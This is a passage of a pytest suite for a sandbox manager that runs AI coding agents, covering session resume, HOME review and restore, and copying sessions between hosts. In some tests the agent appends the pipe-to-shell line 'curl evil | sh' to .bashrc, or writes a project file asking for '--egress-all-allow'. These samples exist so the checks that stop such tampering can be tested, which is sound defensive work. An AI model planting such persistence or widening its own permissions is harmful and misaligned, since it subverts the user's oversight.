        assert m.session_dir("t").exists()
    elif scenario == "sad":
        # The agent ended: its status; a session without a kept HOME goes, its history stays.
        (m.session_dir("t") / "exit.json").write_text(json.dumps({"run": "claude-1", "status": 7}))
        assert m.after_attach("t") == 7
        assert not m.session_dir("t").exists()
    else:
        # Ended, but the supervisor still cleans up after ENDING_WAIT.
        monkeypatch.setattr(m, "alive", lambda name, d: True)
        monkeypatch.setattr(m, "relay_listening", lambda path: False)
        assert m.after_attach("t") == 0
        assert "still cleaning up" in capsys.readouterr().err


def test_resume_refuses_an_ended_start_without_home(tmp_path):
    stopped_session("gone", keep=False)
    with pytest.raises(ValueError, match="has ended and its HOME was discarded"):
        m.resume("gone")
    assert not m.session_dir("gone").exists()


def test_signal_tree_can_spare_the_root(tmp_path, monkeypatch):
    fake_process(tmp_path, 400, 1)
    fake_process(tmp_path, 401, 400)
    sent = []
    monkeypatch.setattr(m.os, "kill", lambda pid, sig: sent.append(pid))
    m.signal_tree(400, signal.SIGCONT, include_root=False)
    assert sent == [401]


# --- kept starts in the foreground (tasks) -------------------------------------------------------------------


def foreground_args(tmp_path, name="task"):
    a = m.launcher().parse_args(["codex", "--workspace", "/srv/app", "--name", name, "--no-tmux", "--", "exec", "x"])
    a.start_name, a.start_key, a.run_id = name, name, "codex-1a2b3c4d"
    return a


def test_begin(scenario, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    a = foreground_args(tmp_path)
    argv = ["codex", "--workspace", "/srv/app", "--name", "task", "--no-tmux", "--keep", "--", "exec", "x"]
    if scenario == "sad":
        stopped_session("task")
        with pytest.raises(ValueError, match="was taken meanwhile"):
            m.begin(a, argv)
        return
    if scenario == "edge":
        a.backend = "bwrap"
    m.begin(a, argv)
    data = m.load("task")
    assert data["mode"] == "foreground" and data["keep"] is True and data["pid"] == os.getpid()
    assert data["options"] == ["--workspace", "/srv/app", "--no-tmux"] and data["agent_args"] == ["exec", "x"]
    assert data["run"] == "codex-1a2b3c4d" and data["name"] == "task" and data["ready"] is True
    assert data["pod"] == ("agent-codex-1a2b3c4d" if scenario == "happy" else None)
    for path in (m.session_dir("task"), m.session_dir("task") / "home"):
        assert path.stat().st_mode & 0o777 == 0o700


def test_discard_unstarted(scenario, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    a = foreground_args(tmp_path)
    m.begin(a, ["codex"])
    if scenario == "happy":
        m.discard_unstarted(a)  # refused or failed before it registered
        assert not m.session_dir("task").exists()
    elif scenario == "sad":
        a.control_dir = tmp_path / "control"  # it ran: kept
        m.discard_unstarted(a)
        assert m.session_dir("task").exists()
    else:
        b = m.launcher().parse_args(["codex"])  # no kept start at all
        m.discard_unstarted(b)
        assert m.session_dir("task").exists()


def test_alive_of_a_foreground_start(scenario, tmp_path):
    data = {"mode": "foreground", "pid": 500, "pid_start": 77}
    if scenario == "happy":
        fake_process(tmp_path, 500, 1, b"python3\0-I\0/opt/sandbox/agent_sandbox.py\0codex\0", start=77)
        assert m.alive("task", data) is True and m.foreground(data)
    elif scenario == "sad":
        fake_process(tmp_path, 500, 1, b"python3\0/opt/sandbox/agent_sandbox.py\0", start=78)  # a later process
        assert m.alive("task", data) is False
    else:
        fake_process(tmp_path, 500, 1, b"vim\0", start=77)
        assert m.alive("task", data) is False
        assert m.alive("task", {**data, "pid_start": None}) is False  # never without the start time
        # A process that only names a file ending like the launcher (pytest running tests/test_agent_sandbox.py
        # had every task of its own PID taken for running) is not one.
        fake_process(tmp_path, 501, 1, b"python3\0-m\0pytest\0tests/test_agent_sandbox.py\0", start=77)
        assert m.alive("task", {**data, "pid": 501}) is False


def test_foreground_start_pause_attach_and_rebirth(tmp_path, monkeypatch):
    stopped_session("task", mode="foreground", keep=True, backend="bwrap", pid=510, pid_start=5,
                    agent_args=["exec", "x"], run="codex-1")
    fake_process(tmp_path, 510, 1, b"python3\0agent_sandbox.py\0", start=5)
    tree = Mock()
    monkeypatch.setattr(m, "signal_tree", tree)
    assert m.status("task", m.load("task")) == "running"
    with pytest.raises(ValueError, match="runs without tmux"):
        m.attach("task")
    assert m.pause("task") == 0 and m.resume("task") == 0
    # The launcher holds a terminal: only what runs below it is frozen.
    assert [c.kwargs for c in tree.call_args_list] == [{"include_root": False}, {"include_root": False}]
    # Once it ended, resume brings it back as a session, continuing the task's conversation interactively.
    (tmp_path / "proc" / "510" / "cmdline").write_bytes(b"vim\0")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("task") == 0
    assert launch.call_args.args[2] == ["resume", "--last"]


def test_check_keep_policy(scenario, monkeypatch):
    policy = {"happy": {}, "sad": {"version": 1, "forbid_keep": True}, "edge": {"version": 1, "forbid_keep": False}}
    monkeypatch.setattr(m.launcher(), "load_policy", lambda path=None: policy[scenario])
    if scenario == "sad":
        with pytest.raises(ValueError, match="forbids using one \\(forbid_keep"):
            m.check_keep_policy("web")
        stopped_session("web", keep=True)
        with pytest.raises(ValueError, match="forbid_keep"):
            m.resume("web")
    else:
        m.check_keep_policy("web")


# --- rebirth: a new run id each time, and what changed in the HOME ----------------------------------------


def kept_home_session(name="web", **fields):
    data = stopped_session(name, keep=True, run="codex-00000001", pod="agent-codex-00000001", ready=True, **fields)
    home = m.session_dir(name) / "home"
    home.mkdir(mode=0o700)
    (home / ".bashrc").write_text("export A=1\n")
    return data, home


def test_rebirth_gets_a_new_run_id(tmp_path, monkeypatch):
    kept_home_session()
    cleared, seen = [], {}
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, data: cleared.append(data["pod"]))

    # Whether the last run's pod still runs is asked of Podman (subprocess.run, which the fake Popen below would
    # answer): here there is no Podman, so no pod of it runs - on a machine with one too (a CI runner).
    def no_podman(*args, **kwargs):
        raise FileNotFoundError("podman")
    monkeypatch.setattr(m.liveness(), "RUNNER", no_podman)
    m.liveness()._cache.clear()

    def popen(cmd, **kwargs):
        seen["cmd"] = cmd
        (m.session_dir("web") / "tmux" / "attach.sock").touch()
        return Mock(pid=4260, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.resume("web") == 0
    data = m.load("web")
    assert cleared == ["agent-codex-00000001"]  # the last run's pod, if it was left behind
    assert data["run"] != "codex-00000001" and data["pod"] == f"agent-{data['run']}"
    assert seen["cmd"][seen["cmd"].index("--pod-name") + 1] == data["pod"]
    assert [(e["event"], e["run"]) for e in m.starts().history("web")] == [("rebirth", data["run"])]


def test_review_home(scenario, tmp_path, monkeypatch, capsys):
    data, home = kept_home_session()
    m.home_review().record(home, m.session_dir("web"), run="codex-00000001")
    if scenario == "happy":
        assert m.review_home("web", data)["changes"] == []
        assert capsys.readouterr().err == ""
    elif scenario == "sad":
        # The agent left something for the next start: named, and in a terminal the user may stop here.
        with open(home / ".bashrc", "a") as stream:
            stream.write("curl evil | sh\n")
        monkeypatch.setattr(m.sys.stdin, "isatty", lambda: True)
        monkeypatch.setattr(m.sys.stdout, "isatty", lambda: True)
        monkeypatch.setattr("builtins.input", lambda prompt: "n")
        launch = Mock(return_value=0)
        monkeypatch.setattr(m, "launch", launch)
        monkeypatch.setattr(m, "attach", Mock(return_value=0))
        with pytest.raises(ValueError, match="web was not started; see the changes with: sandbox-ai resume web "
                                             "--review-home"):
            m.resume("web")
        err = capsys.readouterr().err
        assert "the HOME of web changed since its last start" in err and "changed  .bashrc" in err
        assert not launch.called
        assert m.home_review().saved_review(m.session_dir("web"))["changes"][0]["path"] == ".bashrc"
        monkeypatch.setattr("builtins.input", lambda prompt: "")  # Enter: go on
        assert m.resume("web") == 0 and launch.called
    else:
        # No terminal: named, and the start goes on; no manifest (older starts): nothing to compare.
        (home / ".bashrc").write_text("other\n")
        assert m.review_home("web", data)["changes"][0]["change"] == "changed"
        assert "changed  .bashrc" in capsys.readouterr().err
        (m.session_dir("web") / "home-manifest.json").unlink()
        assert m.review_home("web", data) is None
        assert m.review_home("web", {**data, "keep": False}) is None


def test_review_command(scenario, tmp_path, monkeypatch):
    data, home = kept_home_session()
    m.home_review().record(home, m.session_dir("web"))
    (home / ".bashrc").write_text("export A=2\n")
    lines = []
    if scenario == "happy":
        assert m.review("web", out=lines.append) == 0
        assert "== changed .bashrc" in lines and "+export A=2" in lines
    elif scenario == "sad":
        stopped_session("plain", keep=False)
        with pytest.raises(ValueError, match="keeps no HOME"):
            m.review("plain")
    else:
        assert m.review("web", as_json=True, out=lines.append) == 0
        found = json.loads("\n".join(lines))
        assert found["pending"] is True and found["review"]["changes"][0]["path"] == ".bashrc"
        assert "+export A=2" in found["review"]["changes"][0]["diff"]


def test_delete_forgets_the_canaries_of_the_home(tmp_path, monkeypatch):
    """A kept HOME keeps its canary files from run to run, recorded outside it; deleting the start forgets them."""
    stopped_session("old", keep=True)
    home = m.session_dir("old") / "home"
    spec = importlib.util.spec_from_file_location("canary_for_sessions_test", ROOT / "sandbox/canary.py")
    canary = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(canary)
    record = canary.home_state(home)
    record.parent.mkdir(parents=True, exist_ok=True)
    record.write_text("{}")
    assert m.delete("old", yes=True) == 0
    assert not record.exists() and not m.session_dir("old").exists()


def test_added_options(scenario, tmp_path, monkeypatch):
    """Workspaces and mounts a stopped session starts with: host paths absolute from here, the first workspace kept."""
    extra = tmp_path / "extra"
    extra.mkdir()
    monkeypatch.chdir(tmp_path)
    data = make_session("s")
    if scenario == "happy":
        options = m.added_options(data, ["extra"], [f"{tmp_path}:/mnt/data:ro"])
        assert options[:4] == ["--workspace", "/srv/w", "--backend", "podman"]  # the saved ones first, unchanged
        assert options[4:] == ["--workspace", str(extra), "--mount", f"{tmp_path}:/mnt/data:ro"]
    elif scenario == "sad":
        with pytest.raises(ValueError, match="no such directory"):
            m.added_options(data, ["missing"])
        (tmp_path / "a,b").mkdir()
        with pytest.raises(ValueError, match="comma"):
            m.added_options(data, ["a,b"])
        with pytest.raises(ValueError, match="SOURCE:DESTINATION"):
            m.added_options(data, mounts=["only-a-source"])
    else:
        # A session that named no workspace had its start directory as /work: it stays first.
        data = {**data, "options": ["--backend", "podman"], "cwd": str(tmp_path / "extra")}
        options = m.added_options(data, [str(tmp_path)], ["rel:/opt/x"])
        assert options == ["--backend", "podman", "--workspace", str(extra), "--workspace", str(tmp_path),
                           "--mount", f"{tmp_path / 'rel'}:/opt/x"]


def test_resume_with_a_workspace_starts_with_it_and_keeps_it(tmp_path, monkeypatch):
    extra = tmp_path / "notes"
    extra.mkdir()
    make_session("s")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("s", [str(extra)]) == 0
    data = launch.call_args.args[1]
    assert data["options"][-2:] == ["--workspace", str(extra)] and launch.call_args.args[2] == ["resume", "--last"]


def test_resume_with_a_workspace_that_fails_keeps_the_old_options(tmp_path, monkeypatch):
    extra = tmp_path / "notes"
    extra.mkdir()
    before = make_session("s")["options"]
    monkeypatch.setattr(m, "launch", Mock(side_effect=RuntimeError("refused by the policy")))
    with pytest.raises(RuntimeError, match="policy"):
        m.resume("s", [str(extra)])
    assert m.load("s")["options"] == before


def test_resume_with_a_workspace_refuses_a_running_session(tmp_path, monkeypatch):
    make_session("s", pid=61, tmp_path=tmp_path)
    monkeypatch.setattr(m, "alive", lambda name, data: True)
    with pytest.raises(ValueError, match="--restart"):
        m.resume("s", [str(tmp_path)])


# --- review 5 M5: a session's runs keep the /work of its first start ----------------------------------------


def test_run_options_keep_the_first_starts_main_workspace(scenario):
    """A session records which folder became /work because the directory it started in held a project file
    ("cwd_project"); its runs pass that folder first and --workspaces-as-given. A record from before the field keeps
    its options as they were."""
    data = {"agent": "claude", "options": ["--workspace", "/srv/other", "--allow-pypi"]}
    if scenario == "happy":
        assert m.run_options({**data, "cwd_project": "/srv/proj"}) == [
            "--workspace", "/srv/proj", "--workspace", "/srv/other", "--allow-pypi", "--workspaces-as-given"]
        assert m.run_options({**data, "cwd_project": None}) == [*data["options"], "--workspaces-as-given"]
    elif scenario == "sad":
        assert m.run_options(data) == data["options"]  # an older record: as it always ran
    else:  # given already (a start of the app or the web): nothing doubled
        given = {**data, "options": [*data["options"], "--workspaces-as-given"], "cwd_project": None}
        assert m.run_options(given) == given["options"]


def test_a_project_file_the_agent_writes_later_never_takes_a_resume_over(tmp_path, monkeypatch):
    """Review 5 M5: started from W/sub with --workspace W, the agent wrote W/sub/.sandbox-ai.json; the resume (run
    from the saved directory W/sub) made W/sub /work and asked the user to trust the agent's file. It keeps W."""
    work = tmp_path / "w"
    (work / "sub").mkdir(parents=True)
    other = tmp_path / "other"
    other.mkdir()
    data = make_session("s")
    data.update(agent="claude", options=["--workspace", str(other)], cwd=str(work / "sub"), cwd_project=None)
    (work / "sub" / ".sandbox-ai.json").write_text('{"version": 1, "agent": "claude", "options": ["--egress-all-allow"]}')
    monkeypatch.setenv("PWD", str(work / "sub"))
    a, document = m.effective(data)
    assert a is not None and a.workspaces == [str(other)] and not document
    commands = []

    def popen(cmd, **kwargs):
        commands.append(cmd)
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4243, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, d: None)
    assert m.launch("s", data, []) == 0
    assert "--workspaces-as-given" in commands[0] and commands[0][commands[0].index("--workspace") + 1] == str(other)


def test_a_record_of_another_shape_is_damaged_not_a_crash():
    """Review 5 (correctness L1): a session.json holding [] crashed `list`, `ps` and `session list` with an
    AttributeError (and hid every other start in the web and the app)."""
    make_session("good")
    directory = m.session_dir("bad2")
    directory.mkdir(parents=True)
    (directory / "session.json").write_text("[]")
    with pytest.raises(ValueError, match="damaged"):
        m.load("bad2")
    assert m.prune("bad2") is False
    rows = {row[0]: row for row in m.rows()}
    assert rows["bad2"][3] == "damaged" and "good" in rows


# -- a session to another host (sandbox-ai session copy|move) --


def test_a_session_is_copied_to_a_host_checked_first_with_its_folders_mapped(tmp_path, monkeypatch):
    make_session("work")
    data = m.load("work")
    data["options"] = ["--workspace", "/srv/w", "--mount", "/srv/data:/mnt/data:ro", "--backend", "podman",
                       "--allow-host", "pypi.org"]
    data["agent_args"] = ["--model", "gpt-5", "write the tests"]
    m.save("work", data)
    calls, lines = [], []

    def run(host, args, timeout=120):
        calls.append((host, args))
        return (1, "", "sandbox-ai session: No session named work\n") if args[:2] == ["session", "plan"] else (0, "", "")
    status = m.copy_to_host("work", "ct1", maps=["/srv=/home/me/srv"], run=run, out=lines.append)
    assert status == 0
    asked, check, login, start = calls
    assert login == ("ct1", ["login", "--status"]), "the host's own login of the agent: said when missing"
    assert asked == ("ct1", ["session", "plan", "work", "--json"]), "is there a session of that name already?"
    assert check == ("ct1", ["codex", "--dry-run", "--no-config", "--workspace", "/home/me/srv/w", "--mount",
                             "/home/me/srv/data:/mnt/data:ro", "--backend", "podman", "--allow-host", "pypi.org"])
    assert start[1][:4] == ["codex", "--session", "work", "--no-config"]
    assert start[1][-3:] == ["--", "--model", "gpt-5"], "the agent's options go along, the task is not run again"
    assert "runs on ct1 as work" in lines[-1]


def test_a_copy_that_cannot_start_there_starts_nothing(monkeypatch):
    make_session("work")
    calls, lines = [], []

    def run(host, args, timeout=120):
        calls.append(args)
        return 2, "", "agent-sandbox: workspace /srv/w does not exist\n"
    assert m.copy_to_host("work", "ct1", run=run, out=lines.append) == 1
    assert len(calls) == 2 and "--dry-run" in calls[1], "only checked"
    assert any("does not exist" in line for line in lines) and any("--map" in line for line in lines)


def test_move_stops_the_session_here_and_check_starts_nothing(monkeypatch):
    make_session("work")
    stopped = []
    monkeypatch.setattr(m, "stop", lambda name, timeout=30: stopped.append(name) or 0)
    calls = []
    run = lambda host, args, timeout=120: calls.append(args) or (0, "", "")  # noqa: E731
    assert m.copy_to_host("work", "ct1", new_name="work-2", move=True, run=run, out=lambda _l: None) == 0
    assert calls[-1][:3] == ["codex", "--session", "work-2"] and stopped == ["work"]
    calls.clear()
    assert m.copy_to_host("work", "ct1", start=False, run=run, out=lambda _l: None) == 0
    assert len(calls) == 3 and calls[0][:2] == ["session", "plan"] and "--dry-run" in calls[1]
    assert calls[2] == ["login", "--status"]


class Remote:
    """A host for session copy: its sessions (name: saved options), the answers of its dry run and its start, and
    every command it was given."""

    def __init__(self, sessions=None, check=(0, "{}", ""), start=(0, "", ""), logins=None):
        self.sessions, self.check, self.start, self.calls = dict(sessions or {}), check, start, []
        self.logins = logins or ("claude    host         logged in  (/h/.claude/.credentials.json)\n"
                                 "codex     login store  logged in  (/s/codex/auth.json)\n")

    def __call__(self, host, args, timeout=120):
        self.calls.append(list(args))
        if args[:2] == ["session", "plan"]:
            if args[2] not in self.sessions:
                return 1, "", f"sandbox-ai session: No session named {args[2]}\n"
            return 0, json.dumps({"agent": "codex", "options": self.sessions[args[2]], "agent_args": [],
                                  "paths": [], "problems": []}), ""
        if args[:2] == ["session", "delete"]:
            if args[2] not in self.sessions:
                return 1, "", f"sandbox-ai session: No session named {args[2]}\n"
            del self.sessions[args[2]]
            return 0, "", ""
        if args == ["login", "--status"]:
            return 0, self.logins, ""
        if "--dry-run" in args:
            return self.check
        if "--session" in args:
            self.sessions[args[args.index("--session") + 1]] = [a for a in args[1:] if a != "--session"]
            return self.start
        return 1, "", "unexpected"


def test_a_session_of_that_name_there_is_refused_unless_replaced(monkeypatch):
    """Regression: a copy that found a session of its name there started that one again with its own saved options
    (the workspace of this machine) and only warned that the new ones were ignored."""
    make_session("work")
    remote, lines = Remote({"work": ["--workspace", "/mnt/ext/w"]}), []
    assert m.copy_to_host("work", "ct1", maps=["/srv=/home/me"], run=remote, out=lines.append) == 1
    assert "has a session work already" in lines[-1] and "/mnt/ext/w" in lines[-1] and "--replace" in lines[-1]
    assert [c[:2] for c in remote.calls] == [["session", "plan"]], "nothing checked or started"
    # The check says it too, and with --replace what will happen.
    lines.clear()
    assert m.copy_to_host("work", "ct1", start=False, run=remote, out=lines.append) == 1
    assert m.copy_to_host("work", "ct1", start=False, run=remote, out=lines.append, replace=True) == 0
    assert "is replaced (--replace)" in lines[-1] and "work" in remote.sessions, "a check deletes nothing"
    # --replace: deleted there first, then started with the folders as mapped now.
    remote.calls.clear()
    assert m.copy_to_host("work", "ct1", maps=["/srv=/home/me"], run=remote, out=lines.append, replace=True) == 0
    assert [c[:2] for c in remote.calls] == [["session", "plan"], ["codex", "--dry-run"], ["login", "--status"],
                                             ["session", "delete"], ["codex", "--session"]]
    assert remote.calls[3] == ["session", "delete", "work", "--yes"]
    assert remote.sessions["work"][:4] == ["work", "--no-config", "--workspace", "/home/me/w"]


def test_a_start_there_that_fails_leaves_no_session_there(monkeypatch):
    """Regression: a failed start left a stopped session there, which the next try (with another --map) resumed with
    the options that failed."""
    make_session("work")
    remote, lines = Remote(start=(1, "", "agent-sandbox: [Errno 13] Permission denied: '/srv'\n")), []
    assert m.copy_to_host("work", "ct1", run=remote, out=lines.append) == 1
    assert remote.calls[-1] == ["session", "delete", "work", "--yes"] and "work" not in remote.sessions
    assert "half-made session work on ct1 was removed" in lines[-1]
    # SSH failed or the start may still go on: nothing is deleted.
    for status in (124, 255):
        remote = Remote(start=(status, "", ""))
        assert m.copy_to_host("work", "ct1", run=remote, out=lambda _l: None) == status
        assert remote.calls[-1][:2] == ["codex", "--session"]


def test_the_check_says_a_missing_login_there_and_the_launchers_warnings():
    """Regression: the check said it can start, then the start said "the host has no claude login"."""
    make_session("work")
    remote = Remote(check=(0, "{}", "agent-sandbox: warning: something to know\n"),
                    logins="claude    host         no login  (/h/.claude/.credentials.json)\n"
                           "codex     host         no login  (/h/.codex/auth.json)\n")
    lines = []
    assert m.copy_to_host("work", "ct1", start=False, run=remote, out=lines.append) == 0
    assert any("ct1 has no codex login" in line and "sandbox-ai hosts run ct1 login codex" in line for line in lines)
    assert any(line.endswith("warning: something to know") for line in lines)
    assert "can start on ct1" in lines[-1]
    # Logged in there, or a start that brings its own login (--no-auth): nothing to say, not even asked.
    for logins, options in ((None, []), (remote.logins, ["--no-auth"])):
        data = m.load("work")
        data["options"] = ["--workspace", "/srv/w", *options]
        m.save("work", data)
        remote, lines = Remote(logins=logins), []
        assert m.copy_to_host("work", "ct1", start=False, run=remote, out=lines.append) == 0
        assert not any("login" in line for line in lines)
        assert (["login", "--status"] in remote.calls) == (not options)


def test_every_folder_of_the_options_is_mapped():
    """Each folder of a --workspace list, --workspace-name's and a preset's folder are mapped; --workspace-ro is a
    switch (it took the next option for its value, so a --mount after it was never mapped)."""
    options = ["--workspace", "/srv/a,/srv/b", "--workspace-ro", "--mount", "/srv/d:/mnt/d:ro",
               "--workspace-name", "bee=/srv/b", "--preset-value", "samples=/srv/s", "--preset-value", "vpn=/x",
               "--git-token-file=github.com=/srv/t", "--allow-host", "/srv/no"]
    maps = m.parse_maps(["/srv=/data"])
    assert m.map_options(options, maps) == [
        "--workspace", "/data/a,/data/b", "--workspace-ro", "--mount", "/data/d:/mnt/d:ro",
        "--workspace-name", "bee=/data/b", "--preset-value", "samples=/data/s", "--preset-value", "vpn=/x",
        "--git-token-file=github.com=/data/t", "--allow-host", "/srv/no"]
    assert m.option_paths(options) == ["/srv/a", "/srv/b", "/srv/d", "/srv/s", "/x", "/srv/t"]


def test_what_cannot_go_along_is_said_and_bad_input_refused(monkeypatch, tmp_path):
    make_session("work")
    project = tmp_path / "p"
    project.mkdir()
    data = m.load("work")
    data["cwd"] = str(project)
    m.save("work", data)
    monkeypatch.setattr(m.launcher(), "load_project_config",
                        lambda a: (project / ".sandbox-ai.json", {"version": 1, "mcp_servers": {"mine": {}},
                                                                  "rules": {"x": 1}}))
    monkeypatch.setattr(m.launcher(), "merge_config", lambda argv, a, document: argv)
    lines = []
    assert m.copy_to_host("work", "ct1", run=lambda *a, **k: pytest.fail("nothing runs"), out=lines.append) == 1
    assert any("own MCP servers (mine)" in line for line in lines) and any("ruleset" in line for line in lines)
    with pytest.raises(ValueError, match="LOCAL=REMOTE"):
        m.parse_maps(["relative=/x"])
    with pytest.raises(ValueError, match="not a session name"):
        m.copy_to_host("work", "ct1", new_name="../x", run=lambda *a, **k: (0, "", ""))
    assert m.mapped("/srvx/a", m.parse_maps(["/srv=/s"])) == "/srvx/a", "a prefix is a whole folder"


def test_the_plan_of_a_copy_as_json_names_its_host_paths(capsys):
    make_session("work")
    data = m.load("work")
    data["options"] = ["-w", "/srv/w/", "--mount=/srv/data:/mnt/d:ro", "--copy", "/etc/x:/y", "--allow-host", "/no",
                       "--backend", "podman"]
    m.save("work", data)
    assert m.cli(["plan", "work", "--json"]) == 0
    plan = json.loads(capsys.readouterr().out)
    assert plan["agent"] == "codex" and plan["problems"] == []
    assert plan["paths"] == ["/srv/w", "/srv/data", "/etc/x"]
    assert m.cli(["plan", "work", "--map", "/srv=/data"]) == 0
    assert json.loads(capsys.readouterr().out)["paths"][:2] == ["/data/w", "/data/data"], "with --map: moved"


# --- a rebirth's options: resume NAME --gui --cpus 4 --allow-host H --drop-option OPTION ---------------------


def test_changed_options_replace_single_values_and_add_to_lists(scenario, tmp_path, monkeypatch):
    """One value (--cpus, --gui, --canaries/--no-canaries) replaces the saved one, a list option adds its value
    (once), --drop-option takes every value or one out; host paths are made absolute from here."""
    monkeypatch.chdir(tmp_path)
    data = {**make_session("s"), "options": ["--workspace", "/srv/w", "--cpus", "2", "--allow-host=a.example",
                                             "--allow-pypi", "--no-canaries", "-A", "b.example"]}
    if scenario == "happy":
        options, changes = m.changed_options(data, ["--cpus", "4", "--gui", "--allow-host", "C.example",
                                                    "--allow-host", "a.example", "-gn", "off"])
        assert options == ["--workspace", "/srv/w", "--allow-host=a.example", "--allow-pypi", "--no-canaries",
                           "--allow-host", "b.example", "--cpus", "4", "--gui", "--allow-host", "C.example",
                           "--git-logins", "off"]
        assert changes == ["set: --cpus 4 (was: --cpus 2)", "set: --gui", "added: --allow-host C.example",
                           "kept: --allow-host a.example (saved already)", "set: --git-logins off"]
        # --canaries replaces --no-canaries (one dest); --drop-option: all of a list, one value, one preset.
        options, changes = m.changed_options(data, ["--canaries", "home"], ["allow-host=B.example", "--allow-pypi",
                                                                            "cpus"])
        assert options == ["--workspace", "/srv/w", "--allow-host=a.example", "--canaries", "home"]
        assert changes[:3] == ["dropped: --allow-host b.example", "dropped: --allow-pypi", "dropped: --cpus 2"]
        assert changes[3] == "set: --canaries home (was: --no-canaries)"
        options, _ = m.changed_options(data, ["--rules", "mine.json"], ["--allow-host"])
        assert "--allow-host" not in " ".join(options) and options[-2:] == ["--rules", str(tmp_path / "mine.json")]
    elif scenario == "sad":
        for given, dropped, match in ((["--name", "x"], [], "not changed by a rebirth"),
                                      (["--backend", "bwrap"], [], "not changed by a rebirth"),
                                      (["--no-keep"], [], "sandbox-ai delete"),
                                      (["--workspace", "/x"], [], "--workspace DIR of resume"),
                                      (["--frobnicate"], [], "not an option of the launcher"),
                                      (["--cpus"], [], "needs a value"),
                                      ([], ["--gui"], "not among the saved options"),
                                      ([], ["--allow-host=zzz.example"], "not among the saved options"),
                                      ([], ["--workspace"], "not changed by a rebirth"),
                                      ([], ["--frob"], "no such option"),
                                      ([], ["--gui=1"], "takes no value"),
                                      (["--gpu", "nonsense"], [], "do not go together")):
            with pytest.raises(ValueError, match=re.escape(match)):
                m.changed_options(data, given, dropped)
    else:
        # A mount and an MCP server added earlier may be dropped (they are the resume's own to add).
        data["options"] += ["--mount", f"{tmp_path}:/mnt/x:ro", "--mcp", "fetch"]
        options, changes = m.changed_options(data, [], [f"--mount={tmp_path}:/mnt/x:ro", "mcp"])
        assert "--mount" not in options and "--mcp" not in options and len(changes) == 2


def test_resume_with_options_runs_the_checks_of_a_start_and_keeps_them(tmp_path, monkeypatch):
    work = tmp_path / "w"
    work.mkdir()
    data = make_session("s")
    data.update(options=["--workspace", str(work)], cwd=str(tmp_path), keep=True)
    m.save("s", data)
    launch, checked = Mock(return_value=0), []
    monkeypatch.setattr(m, "launch", launch)
    monkeypatch.setattr(m, "check_start", lambda name, d: checked.append(list(d["options"])))
    assert m.resume("s", options=["--gui", "--memory", "4g"]) == 0
    assert checked == [["--workspace", str(work), "--gui", "--memory", "4g"]]
    assert launch.call_args.args[1]["options"] == checked[0]
    # Refused by the checks: nothing changes, nothing starts.
    launch.reset_mock()
    monkeypatch.setattr(m, "check_start", Mock(side_effect=ValueError("refused by the policy")))
    m.save("s", {**m.load("s"), "options": ["--workspace", str(work)]})
    with pytest.raises(ValueError, match="policy"):
        m.resume("s", options=["--egress-all-allow"])
    assert m.load("s")["options"] == ["--workspace", str(work)] and not launch.called
    # Running: only with --restart (the agent continues its conversation).
    monkeypatch.setattr(m, "alive", lambda name, d: True)
    m.save("s", {**m.load("s"), "pid": 4242})
    with pytest.raises(ValueError, match="--restart"):
        m.resume("s", options=["--gui"])


def test_check_start_is_the_launchers_dry_run(tmp_path):
    """The real launcher with --dry-run, as the supervisor will start: what a start refuses is refused here, before
    anything is saved; what it accepts passes."""
    work = tmp_path / "w"
    work.mkdir()
    data = make_session("s")
    data.update(options=["--workspace", str(work), "--gui", "--cpus", "2"], cwd=str(tmp_path), keep=True)
    m.check_start("s", data)
    with pytest.raises(ValueError, match="would be refused") as refused:
        m.check_start("s", {**data, "options": ["--workspace", str(work), "--mode", "paranoid", "--gui"]})
    assert "paranoid" in str(refused.value)
    # An untrusted project file in the workspace: refused as a start would be.
    (work / ".sandbox-ai.json").write_text('{"version": 1, "agent": "codex", "options": ["--egress-all-allow"]}')
    with pytest.raises(ValueError, match="not trusted"):
        m.check_start("s", {**data, "options": ["--workspace", str(work)]})


# --- resume NAME --restore-home -------------------------------------------------------------------------------


def restorable_session(tmp_path):
    data = stopped_session("web", keep=True)
    home = m.session_dir("web") / "home"
    (home / ".claude/hooks").mkdir(parents=True)
    (home / ".bashrc").write_text("export A=1\n")
    (home / ".gitconfig").write_text("[user]\n\tname = me\n")
    (home / ".claude/hooks/check.sh").write_text("#!/bin/sh\nexit 0\n")
    (home / ".claude/hooks/check.sh").chmod(0o755)
    (home / ".profile").write_bytes(b"\xff\xfe binary-ish\n")
    (home / ".git-credentials").write_text("first line of a credentials file\n")
    m.home_review().record(home, m.session_dir("web"))
    return data, home


def test_restore_home_puts_back_the_recorded_text(scenario, tmp_path):
    data, home = restorable_session(tmp_path)
    outside = tmp_path / "outside"
    outside.write_text("keep\n")
    # What the agent did meanwhile.
    (home / ".bashrc").write_text("export A=1\ncurl evil | sh\n")
    (home / ".gitconfig").unlink()
    (home / ".gitconfig").symlink_to(outside)  # a link in its place: replaced, never written through
    shutil.rmtree(home / ".claude/hooks")
    (home / ".profile").write_text("changed\n")
    (home / ".git-credentials").write_text("another line\n")
    (home / ".zshrc").write_text("new\n")
    lines = []
    if scenario == "happy":
        assert m.restore_home("web", yes=True, as_json=True, out=lines.append) == 0
        result = json.loads("\n".join(lines))
        assert sorted(result["restored"]) == [".bashrc", ".claude/hooks/check.sh", ".gitconfig"]
        assert (home / ".bashrc").read_text() == "export A=1\n" and not (home / ".gitconfig").is_symlink()
        assert (home / ".gitconfig").read_text() == "[user]\n\tname = me\n" and outside.read_text() == "keep\n"
        assert (home / ".claude/hooks/check.sh").stat().st_mode & 0o777 == 0o755
        reasons = {entry["path"]: entry["reason"] for entry in result["skipped"]}
        assert "added since" in reasons[".zshrc"] and "key or token" in reasons[".git-credentials"]
        assert "not its exact content" in reasons[".profile"]
        assert (home / ".zshrc").exists() and (home / ".profile").read_text() == "changed\n"
        assert m.starts().history("web")[-1]["event"] == "restore-home"
    elif scenario == "sad":
        with pytest.raises(ValueError, match="--yes"):
            m.restore_home("web")  # no terminal to ask in
        with pytest.raises(ValueError, match="not among the changes"):
